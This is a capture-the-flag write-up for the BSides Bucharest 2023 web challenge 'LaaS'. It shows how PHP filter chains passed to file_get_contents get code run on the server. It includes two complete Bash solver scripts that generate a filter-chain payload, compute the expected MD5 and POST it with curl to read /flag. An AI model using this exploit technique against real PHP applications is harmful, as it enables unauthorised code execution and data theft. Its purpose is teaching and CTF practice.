---
layout: post
title:  "Writeup for Bsides Bucharest 2023 Web Challenge : LaaS"
tags: ctf web bsides 2023 
---

This was a really good web challenge, I liked it a lot.

We are given a link to a webpage, let's see what we have there.
<img src="/assets/images/initial-webpage-laas.png" alt="Initial webpage for the challenge">

At a quick glance, it seems like we are able to read files, but there should definitely be a catch.
Let's inspect the source code for the challenge and try to find the catch.

<img src="/assets/images/source-code-webpage-laas.png" alt="Source code for the challenge">

We can control two variables : 
```php
$_POST['file']
``` and 
```php 
$_POST['mac']
```

Let's see what we can do with the __mac__ parameter. It is only used once to check the hash. The equality verification is performed in a safe way. It seems this parameter is only here to make our life harder. We cannot possibly know the MD5 hash of a file on the remote host, especially of the flag file.
The __file__ parameter is way more interesting. The script uses the file_get_contents PHP function in order to read the file contents. Then, if the provided hash matches the calculated hash, the file is included in the response. 
This could be either an LFI or an RFI. Due to the fact that file_get_contents also URLs and PHP filters as valid file content sources, it feels more likely that we have to force the script to include a remote file. 

After a lot of trial and error, PHP filters were looking most promising.
I found a wonderful tool that generates payloads for our exact condition <a href="https://github.com/synacktiv/php_filter_chain_generator">here</a>.
*Quickly added to the notes with useful bug bounty tools*

Let's confirm that we can achieve code execution with RFI.
I like to do it by invoking the phpinfo() function. I have never seen an environment in which the phpinfo function is disabled, so it's a safe option. Also, we might discover disabled functions or interesting environment variables, so it's good to always keep an eye on the output of this function.

I put together a Bash script to automate the testing.

```bash
#!/bin/bash

_COMMAND='<?php phpinfo();  ?>'

_file_cmd="python3 php_filter_chain_generator.py --chain '$_COMMAND'"; 
cmd_output=$(bash -c "$_file_cmd" | tail -n 1);
file=`echo $cmd_output | sed 's/ *$//' | sed 's/^ *//'`

echo "<?php" > solver.php
echo "\$encoded = \"$file\";" >> solver.php
echo "\$content = file_get_contents(\$encoded);" >> solver.php
echo "\$f = fopen('data.bin', 'wb');" >> solver.php
echo "fwrite(\$f, \$content);" >> solver.php
echo "fclose(\$f);" >> solver.php
echo "?>" >> solver.php

php solver.php

_hash=$(md5sum data.bin | awk '{print $1}')

curl -s -X POST "https://laas.fly.dev/" -d "mac=$_hash&file=$file" --output output
cat output
```

First of all we craft a filter chain using the wonderful tool written by Synacktiv.
Then, we craft a PHP script that outputs the result obtained from the reading of the filter chain.
Last but not least, we compute the MD5 hash of the binary file containing the PHP code that should be included in the remote webpage and we submit the form.


After running the script, redirecting the output to a local file and opening the local file in a browser, we are greeted with a wonderful result : the well deserved code execution.

<img src="/assets/images/phpinfo-output-laas.png" alt="phpinfo output after sending the filter chain">

The final script looks like this:

```bash
#!/bin/bash

_COMMAND='<?php echo readfile("/flag");  ?>'

_file_cmd="python3 php_filter_chain_generator.py --chain '$_COMMAND'"; 
cmd_output=$(bash -c "$_file_cmd" | tail -n 1);
file=`echo $cmd_output | sed 's/ *$//' | sed 's/^ *//'`

echo "<?php" > solver.php
echo "\$encoded = \"$file\";" >> solver.php
echo "\$content = file_get_contents(\$encoded);" >> solver.php
echo "\$f = fopen('data.bin', 'wb');" >> solver.php
echo "fwrite(\$f, \$content);" >> solver.php
echo "fclose(\$f);" >> solver.php
echo "?>" >> solver.php

php solver.php

_hash=$(md5sum data.bin | awk '{print $1}')

curl -s -X POST "https://laas.fly.dev/" -d "mac=$_hash&file=$file" --output output
cat output
```

Thanks for reading and keep hacking :)
